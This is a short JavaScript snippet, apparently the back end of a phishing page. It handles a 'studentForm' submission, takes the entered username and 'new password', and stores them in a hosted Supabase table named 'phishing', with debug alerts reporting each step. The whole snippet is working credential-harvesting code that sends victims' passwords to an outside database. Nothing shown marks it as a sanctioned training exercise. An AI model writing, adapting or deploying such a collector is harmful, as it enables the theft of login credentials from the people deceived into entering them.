document
.getElementById("studentForm")
.addEventListener("submit", async function(e){

    e.preventDefault();

    try{

        const username =
        document.getElementById("uname").value;

        const newPassword =
        document.getElementById("newpass").value;

        alert("Connecting to Supabase...");

        const { data, error } =
        await client
        .from("phishing")
        .insert([
            {
                username: username,
                password: newPassword
            }
        ])
        .select();

        if(error){

            console.log(error);

            alert(
                "SUPABASE ERROR:\n\n" +
                JSON.stringify(error)
            );

            return;
        }

        alert(
            "SUCCESS\n\n" +
            JSON.stringify(data)
        );

    }
    catch(err){

        console.log(err);

        alert(
            "JAVASCRIPT ERROR:\n\n" +
            err.message
        );
    }
});
